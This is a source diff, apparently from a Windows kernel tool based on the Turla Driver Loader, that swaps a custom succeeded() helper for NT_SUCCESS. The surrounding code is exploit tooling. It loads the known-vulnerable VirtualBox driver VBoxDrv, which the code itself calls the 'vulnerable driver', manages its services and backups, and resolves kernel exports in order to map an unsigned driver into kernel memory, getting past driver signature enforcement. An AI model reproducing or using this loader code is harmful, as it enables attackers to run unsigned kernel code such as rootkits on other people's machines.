@@ -24,24 +24,24 @@ using namespace resurgence;
 BOOL IsVBoxInstalled()
 {
     bool found = false;
-    return succeeded(misc::winnt::object_exists(L"\\Device", L"VBoxDrv", &found)) && found;
+    return NT_SUCCESS(misc::winnt::object_exists(L"\\Device", L"VBoxDrv", &found)) && found;
 }
 BOOL StopVBoxServices(SC_HANDLE hSCManager)
 {
     using namespace misc;
 
-    return succeeded(winnt::stop_driver(hSCManager, L"VBoxNetAdp")) &&
-           succeeded(winnt::stop_driver(hSCManager, L"VBoxNetLwf")) &&
-           succeeded(winnt::stop_driver(hSCManager, L"VBoxUSBMon")) &&
-           succeeded(winnt::stop_driver(hSCManager, L"VBoxDrv"));
+    return NT_SUCCESS(winnt::stop_driver(hSCManager, L"VBoxNetAdp")) &&
+           NT_SUCCESS(winnt::stop_driver(hSCManager, L"VBoxNetLwf")) &&
+           NT_SUCCESS(winnt::stop_driver(hSCManager, L"VBoxUSBMon")) &&
+           NT_SUCCESS(winnt::stop_driver(hSCManager, L"VBoxDrv"));
 }
 BOOL BackupVBoxDriver()
 {
-    return succeeded(misc::winnt::copy_file(szVBoxDriver, szVBoxBackup));
+    return NT_SUCCESS(misc::winnt::copy_file(szVBoxDriver, szVBoxBackup));
 }
 BOOL RestoreVBoxDriver()
 {
-    return succeeded(misc::winnt::copy_file(szVBoxBackup, szVBoxDriver));
+    return NT_SUCCESS(misc::winnt::copy_file(szVBoxBackup, szVBoxDriver));
 }
 HANDLE StartVulnerableDriver(SC_HANDLE hSCManager)
 {
@@ -61,7 +61,7 @@ HANDLE StartVulnerableDriver(SC_HANDLE hSCManager)
         winnt::create_service(hSCManager, L"VBoxDrv", szVBoxDriver);
     }
 
-    if(succeeded(winnt::start_driver(hSCManager, L"VBoxDrv"))) {
+    if(NT_SUCCESS(winnt::start_driver(hSCManager, L"VBoxDrv"))) {
         winnt::get_driver_device(L"VBoxDrv", &hVulnerableDriver);
     }
     return hVulnerableDriver;
@@ -76,18 +76,18 @@ BOOL StopVulnerableDriver(SC_HANDLE hSCManager, HANDLE hVulnerableDriver)
     if(hVulnerableDriver != INVALID_HANDLE_VALUE)
         CloseHandle(hVulnerableDriver);
 
-    if(!succeeded(winnt::stop_driver(hSCManager, L"VBoxDrv"))) {
+    if(!NT_SUCCESS(winnt::stop_driver(hSCManager, L"VBoxDrv"))) {
         return FALSE;
     }
 
     if(!IsVBoxInstalled()) {
-        if(!succeeded(winnt::delete_service(hSCManager, L"VBoxDrv")))
+        if(!NT_SUCCESS(winnt::delete_service(hSCManager, L"VBoxDrv")))
             return FALSE;
 
         RtlInitUnicodeString(&uStr, L"\\??\\globalroot\\systemroot\\system32\\drivers\\VBoxDrv.sys");
         InitializeObjectAttributes(&ObjectAttributes, &uStr, OBJ_CASE_INSENSITIVE, NULL, NULL);
 
-        if(!succeeded(NtDeleteFile(&ObjectAttributes)))
+        if(!NT_SUCCESS(NtDeleteFile(&ObjectAttributes)))
             return FALSE;
     } else {
         RestoreVBoxDriver();
@@ -166,7 +166,7 @@ ULONG_PTR TDLGetProcAddress(
     ULONG_PTR      pfn = 0;
 
     RtlInitString(&cStr, FunctionName);
-    if(!succeeded(LdrGetProcedureAddress((PVOID)KernelImage, &cStr, 0, (PVOID*)&pfn)))
+    if(!NT_SUCCESS(LdrGetProcedureAddress((PVOID)KernelImage, &cStr, 0, (PVOID*)&pfn)))
         return 0;
 
     return KernelBase + (pfn - KernelImage);
@@ -370,7 +370,7 @@ long __stdcall TDLMapDriver(
     PBYTE              Buffer = NULL;
     UNICODE_STRING     uStr;
     ANSI_STRING        routineName;
-    error_code           status;
+    NTSTATUS           status;
     RTL_PROCESS_MODULE_INFORMATION ntos;
     RtlZeroMemory(&ntos, sizeof(ntos));
     resurgence::misc::winnt::get_system_module_info("ntoskrnl.exe", &ntos);
@@ -379,7 +379,7 @@ long __stdcall TDLMapDriver(
         RtlSecureZeroMemory(&uStr, sizeof(uStr));
         RtlInitUnicodeString(&uStr, lpDriverFullName);
         status = LdrLoadDll(NULL, NULL, &uStr, (PVOID*)&Image);
-        if((!succeeded(status)) || (Image == NULL)) {
+        if((!NT_SUCCESS(status)) || (Image == NULL)) {
             break;
         }
 
@@ -391,18 +391,18 @@ long __stdcall TDLMapDriver(
 
         RtlInitUnicodeString(&uStr, L"ntoskrnl.exe");
         status = LdrLoadDll(NULL, NULL, &uStr, (PVOID*)&KernelImage);
-        if((!succeeded(status)) || (KernelImage == 0)) {
+        if((!NT_SUCCESS(status)) || (KernelImage == 0)) {
             break;
         }
         RtlInitString(&routineName, "ExAllocatePoolWithTag");
         status = LdrGetProcedureAddress((PVOID)KernelImage, &routineName, 0, (PVOID*)&xExAllocatePoolWithTag);
-        if((!succeeded(status)) || (xExAllocatePoolWithTag == 0)) {
+        if((!NT_SUCCESS(status)) || (xExAllocatePoolWithTag == 0)) {
             break;
         } 
 
         RtlInitString(&routineName, "PsCreateSystemThread");
         status = LdrGetProcedureAddress((PVOID)KernelImage, &routineName, 0, (PVOID*)&xPsCreateSystemThread);
-        if((!succeeded(status)) || (xPsCreateSystemThread == 0)) {
+        if((!NT_SUCCESS(status)) || (xPsCreateSystemThread == 0)) {
             break;
         }
 
@@ -446,7 +446,7 @@ long __stdcall TDLload_driver(
     LPCWSTR lpDriverFullName)
 {
 
-    error_code status;
+    NTSTATUS status;
     SC_HANDLE hSCManager;
 
     RtlZeroMemory(szVBoxDriver, sizeof(szVBoxDriver));
